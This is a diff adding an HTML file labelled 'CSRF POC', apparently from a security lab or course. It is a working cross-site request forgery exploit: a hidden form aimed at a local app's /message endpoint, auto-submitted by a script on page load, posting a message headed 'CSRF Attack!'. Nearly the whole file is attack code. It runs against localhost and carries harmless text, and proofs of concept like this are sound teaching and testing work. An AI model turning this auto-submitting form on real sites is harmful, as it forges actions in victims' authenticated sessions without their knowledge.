@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF POC</title>
+</head>
+<body>
+<form id="myform" action="http://127.0.0.1:5000/message" method="post">
+    <input type="hidden" name="msg_id" value="0"/>
+    <input type="hidden" name="type" value="1"/>
+    <input type="hidden" name="headline" value="CSRF Attack!"/>
+    <input type="hidden" name="content" value="CSRF Exploitation Success!"/>
+    <input type="hidden" name="drafted" value="0"/>
+</form>
+
+<script>
+    const form = document.getElementById('myform');
+    form.submit();
+</script>
+</body>
+</html>
